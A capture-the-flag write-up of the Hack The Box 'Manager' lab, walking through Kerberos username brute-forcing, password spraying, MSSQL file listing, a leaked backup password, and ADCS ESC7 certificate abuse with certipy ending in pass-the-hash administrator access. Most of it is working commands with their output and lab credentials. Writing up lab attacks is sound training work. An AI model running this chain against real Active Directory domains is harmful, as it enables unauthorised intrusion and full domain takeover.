---
title: Hack The Box | Manager Writeup  
date: 2024-03-15 23:00:00 +0530
categories: [Blogging, Writeup, Hack The Box]
tags: [Manager, HTB, Writeup] 
pin: false
math: true
mermaid: true
author: 7h3h0und
image:
  path: /assets/img/headers/manager.png
  lqip: data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAQCAYAAAB3AH1ZAAABhGlDQ1BJQ0MgUHJvZmlsZQAAeJx9kT1Iw0AcxV/TSkUqKnYQccjQOlkQFXHUKhShQqgVWnUwufQLmjQkKS6OgmvBwY/FqoOLs64OroIg+AHi7OCk6CIl/i8ptIj14Lgf7+497t4BQr3MNCswDmi6baYScTGTXRWDr/CjHwMIICozy5iTpCQ6jq97+Ph6F+NZnc/9OXrVnMUAn0g8ywzTJt4gnt60Dc77xGFWlFXic+Ixky5I/Mh1xeM3zgWXBZ4ZNtOpeeIwsVhoY6WNWdHUiKeII6qmU76Q8VjlvMVZK1dZ8578haGcvrLMdZojSGARS5AgQkEVJZRhI0arToqFFO3HO/iHXb9ELoVcJTByLKACDbLrB/+D391a+ckJLykUB7peHOcjCgR3gUbNcb6PHadxAvifgSu95a/UgZlP0mstLXIE9G0DF9ctTdkDLneAoSdDNmVX8tMU8nng/Yy+KQsM3gI9a15vzX2cPgBp6ip5AxwcAqMFyl7v8O7u9t7+PdPs7wc0mHKOWhBNVgAAAyxJREFUeJyVlU9v3EYMxX/kjLR/vFrbSZughxyCHnpo77n1+3+QHooUjp31rqTVDMkepHXRi70RIBACNMPH9x5Juf/lt+AHHxVAoFTYr4W7nVBq8HgCqQ0qCRGl3SaaFVh1ihnhTpvmf23KRDj5R5MnheMIHvBxH/y0Fx6e4eEIXdMgklBVAiXnRJOCRNBoQkNQAQ2nV0VdrgfQrYVd07BJHR8+d7zbZbKvAEE+TTw+9Xw7FPo6MIZzmsCqMVqQEohACfAquCdEFbiCgQCaBLuVsPYVN+2ed/sdP2+F87BHJHOzPyGm9INRDXI7UAMmE1QFlUAlEJFZv4CcoRa9AkDMAG5aJU0tN5stnz6u+XwrHL/fAYnuvdHQ889TYhwbNI+sGhgrpKWIiCUiBOAoSKCvJZeFgqSwykLbtmy6htv7Nfv7jqfa8bVf40lpW8OkEBLkJOT0fxrjvxsRgUAR4XUAFwkW0xMilAo2KVGU6kYNQ02RaJlqYOFcmL4cjJe7BAhi4QJ4WwKR2fHVIWvFbKQ/rRjawnYd7G4SWR1HUK1orlgE9YXyJb0oEYEHRAT4jOFVAJfqi8FYg3U70Zcjfz8q4pnDNKBJGS346+HEYXwmmAgLzlVmqiNmFkQWLzgO1Nqjkq5joFQ4jAbpjLvwtXeGaHg+OxHOJjkPjyeOZaBJifOUGMusboQvUYnw5RWKDYhcMQdUBFGlknEEAaZS+V4Lw2QAFDWmWmlzRlQ5ngUPUBWIIEIwB49YZAgQwT3ekCACzZnVqiW3LZ4ym+2GrmvYNIHgqMzOHgo8nYynUyVRaLRi5oTHYntfWnGOIkLwBoCLBADTVBjPE8NYeTxk1i1khZQSIFgIx6HSnw0zI5ZqI+aud+fl2wPcZmmuGsURgbnjZgwRVDOSziYTkXmpJCV8rs599r5HQDiEvNCPO+GynHtrEIlQSuV06jEz7u/vaFctd3e35KZlnIzb3Zbff/3An1/+YL3Z0Kw3TKUynQu1VCafO67TgkYw2jwrLoXJtes4IiiloiqY+TzjVSnFuN0q3Vap1TmeBcktOWdkYUEIOikcJmECcMd93g3/AuUs/1f4gqqXAAAAAElFTkSuQmCC
---
## Enumeration:

### Port Scan:

Lets start with nmap scan to discover some open ports.
``` bash
# Nmap 7.94SVN scan initiated Wed Mar 13 17:44:46 2024 as: nmap -sV -sC -oA manager 10.129.220.106
Nmap scan report for 10.129.220.106
Host is up (0.050s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: Manager
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-03-13 19:14:29Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.220.106:1433: 
|     Target_Name: MANAGER
|     NetBIOS_Domain_Name: MANAGER
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: manager.htb
|     DNS_Computer_Name: dc01.manager.htb
|     DNS_Tree_Name: manager.htb
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.129.220.106:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2024-03-13T19:15:51+00:00; +6h59m32s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-03-13T18:57:57
|_Not valid after:  2054-03-13T18:57:57
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
|_ssl-date: 2024-03-13T19:15:51+00:00; +6h59m32s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-03-13T19:15:50+00:00; +6h59m32s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-03-13T19:15:13
|_  start_date: N/A
|_clock-skew: mean: 6h59m31s, deviation: 0s, median: 6h59m31s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Mar 13 17:46:19 2024 -- 1 IP address (1 host up) scanned in 92.43 seconds
```
Post nmap scan we could identify that there are several ports open, including typical domain controllers services, web server on port 80, SMB on port 445 and SQL on 1433.

### Web: 

I ensured to add manager.htb to be added to /etc/hosts file with the corresponding IP address in order for
us to be able to access the domain in our browser.

The website hosted on port 80 seems to static and doesn’t seems to have much of a functionality.

### Kerberos:

I wasn't able to find anything with SMB. Hence, I moved on with brute forcing Kerberos to enumerate usernames.

I utilized `kerbrute` a tool that sends Ticket-Granting Ticket (TGT) requests to the Key Distribution Centre (KDC) in the domain with no pre-authentication. 
If the KDC responds with a PRINCIPAL UNKNOWN error, the username does not exist. However, if the KDC prompts for pre-authentication, we know the username exists and we move on. This does not cause any login failures so it will not lock out any accounts. 

```bash
./kerbrute userenum -d manager.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.129.220.106


   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 03/13/24 - Ronnie Flathers @ropnop

2024/03/13 18:10:43 >  Using KDC(s):
2024/03/13 18:10:43 >  	10.129.220.106:88

2024/03/13 18:10:44 >  [+] VALID USERNAME:	 ryan@manager.htb
2024/03/13 18:10:46 >  [+] VALID USERNAME:	 guest@manager.htb
2024/03/13 18:10:47 >  [+] VALID USERNAME:	 cheng@manager.htb
2024/03/13 18:10:48 >  [+] VALID USERNAME:	 raven@manager.htb
2024/03/13 18:10:52 >  [+] VALID USERNAME:	 administrator@manager.htb
2024/03/13 18:11:03 >  [+] VALID USERNAME:	 Ryan@manager.htb
2024/03/13 18:11:05 >  [+] VALID USERNAME:	 Raven@manager.htb
2024/03/13 18:11:10 >  [+] VALID USERNAME:	 operator@manager.htb
2024/03/13 18:11:53 >  [+] VALID USERNAME:	 Guest@manager.htb
2024/03/13 18:11:53 >  [+] VALID USERNAME:	 Administrator@manager.htb
2024/03/13 18:12:28 >  [+] VALID USERNAME:	 Cheng@manager.htb
2024/03/13 18:14:10 >  [+] VALID USERNAME:	 jinwoo@manager.htb
```

I filtered out the usernames using the below command and saved them to a file named `users.txt`.

```bash
grep -Eo '[^ ]+@[^ ]+' usernames.txt | cut -d@ -f1 > users.txt
```
>`grep`: This tool searches for patterns in text files.

>`-E:` This option enables extended regular expressions.

>`o:` This option tells grep to print only the matched part of the line (username).

> `[^ ]+@[^ ]+:` This is the regular expression that matches one or more characters that are not spaces ([^ ]+), followed by "@" symbol, and then again one or more characters that are not spaces. This effectively captures usernames with or without spaces but excludes lines starting with ">".

Many people use the same word for their username and password. This makes it easy to try guessing passwords for many accounts at once. We can use a password spraying tool to try logging in to a system using usernames from a list and see if the password is the same username.

```bash
crackmapexec smb manager.htb -u users.txt -p users.txt
```
![img-description](/assets/img/htb/manager/1.png) _password spraying_

We now have the credentials for user `operator` with password `operator`.


## Foothold:

I tried to access accessing SMB shares using operator credentials but there was nothing that we could leverage. 

I moved on attempting access to MSSQL server,  with SQL server we might have some level of access to filesystem. 

```bash
impacket-mssqlclient -port 1433 manager.htb/operator:operator@10.129.220.106 -windows-auth
```
![img-description](/assets/img/htb/manager/2.png) _MSSQL Server Login_

While trying to figureout whats next, I came accross an article from [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server) and learned that we can use the `xp_dirtree` procedure to traverse the filesystem and list folders.

Initially, I checked for level of permission for `xp_dirtree`.

```bash
EXEC sp_helprotect 'xp_dirtree';
```
![img-description](/assets/img/htb/manager/3.png) _Permissions: xp_dirtree_

Now, I inspected the contents of the web-root folder /inetpub/wwwroot to see if we have anything that we can leverage.

![img-description](/assets/img/htb/manager/4.png) _xp_dirtree:/inetpub/wwwroot_

Found an interesting file `website-backup-27-07-23-old.zip`, which seems to be a backup of the website. 

Given its location within the web root folder, we can go ahead and use wget to download the file.

```bash
wget http://manager.htb/website-backup-27-07-23-old.zip

```
## Privilege Escalation:

### To User Access:
While unzipping the backup file, we can see a hidden file .old-config.xml.

![img-description](/assets/img/htb/manager/5.png) _backup files_

The .old-conf.xml file reveals the password `R4v3nBe5tD3veloP3r!123` for the user Raven.

![img-description](/assets/img/htb/manager/6.png) _old-config.xml_

I used the obtained credentials to connect to the WinRM service running on the target.

![img-description](/assets/img/htb/manager/7.png) _Evil-WinRM: User_

We now own the USER for this machine!

### From User to Root:

I checked the privileges and observed that SeMachineAccountPrivilege is enabled. Unfortunately, there is not much that we can leverage.

Given an Active Directory domain, it might have an `Active Directory Certificate Service (ADCS)` set up. ADCS acts like a Public Key Infrastructure (PKI), essentially managing digital certificates for authentication within the domain. And can contain vulnerabilities that can be leveraged to gain `certificates` and `hashes` of other users. 

I utilized certipy to find any vulnerabilities that may exist. Which indicated that the user Raven possesses hazardous permissions, particularly having "ManageCA" rights over the Certification Authority.

![img-description](/assets/img/htb/manager/8.png) _certipy enumeration_
![img-description](/assets/img/htb/manager/9.png) _certipy output report_
By leveraging the ESC7 scenario, we could potentially elevate our privileges to Domain Admin while operating as user Raven. There is [hacktricks]( https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#vulnerable-certificate-authority-access-control-esc7) article which has a detailed explanation.

To leverage this vulnerability, we would need to add Raven as an “officer” which will allow us to have the ability to manage certificates and issue them.

```bash
certipy-ad ca -add-officer raven -ca 'manager-DC01-CA' -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.220.78
```
Now we as an office can issue and manage certificates, lets enabled `SubCA` template on the CA.
```bash
certipy-ad ca -ca 'manager-DC01-CA' -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -enable-template 'SubCA' -dc-ip 10.129.220.78
Certipy v4.7.0 - by Oliver Lyak (ly4k) 
[*] Successfully enabled 'SubCA' on 'manager-dc01-ca'
```  
Now as we can Manage Certificate and have the `SubCA` template enabled. We can request a certificate based on `SubCA` template.
```bash
certipy-ad req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -template 'SubCA' -target manager.htb -upn administrator@manager.htb
```
![img-description](/assets/img/htb/manager/10.png) _Reqesting SubCA Cert_

The request was denied but as we see we have certificate request ID is 18 and have obtained the private key.

Let us manually issue the failed certificate with the ca through our obtained permissions.
```bash
certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.220.78 -ca manager-dc01-ca -issue-request 18
 Certipy v4.7.0 - by Oliver Lyak (ly4k) 
[*] Successfully issued certificate
```
Now, we retrieve the issued certificate.

```bash
certipy-ad req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -target manager.htb -retrieve 18
```
![img-description](/assets/img/htb/manager/11.png) _Retrieve CA Certificate_


We now have possession of `administrators PFX file`. We can now utilize the PFX to authenticate however it fails with the error "KRB_AP_ERR_SKEW (Clock skew too great)".

```bash
┌──(root㉿Brahma)-[/home/kasyap/kalki/HTB/Manager]
└─# certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.220.78
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@manager.htb
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```
The `"KRB_AP_ERR_SKEW"` error occurs when there is a significant time difference between the client and the `KDC servers`, impacting the Kerberos authentication process.

To resolve this issue, we would need to disable `auto date and time update` in our machine and synchronize our clock with `manager.htb` machine. 
```bash
┌──(root㉿Brahma)-[/home/kasyap/kalki/HTB/Manager]
└─# timedatectl set-ntp 0
                                                                                                                                                                                              
┌──(root㉿Brahma)-[/home/kasyap/kalki/HTB/Manager]
└─# ntpdate -u manager.htb                                     
2024-03-14 03:27:51.880462 (+0530) +25171.590795 +/- 0.023919 manager.htb 10.129.220.78 s1 no-leap
CLOCK: time stepped by 25171.590795
                                            
```
Now with synchronized time between our machine and manager.htb I ran the command again to retrieve the administrator hash.
```bash
┌──(root㉿Brahma)-[/home/kasyap/kalki/HTB/Manager]
└─# certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.220.78
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@manager.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
```
As we have the administrator has I leveraged it to gain access through Evil-WinRM.
```bash
┌──(root㉿Brahma)-[/home/kasyap/kalki/HTB/Manager]
└─# evil-winrm -i 10.129.220.78 -u administrator -H ae5064c2f62317332c88629e025924ef 
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami
manager\administrator
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        3/13/2024   2:36 PM             34 root.txt
```


We have the machine `ROOTED!`  

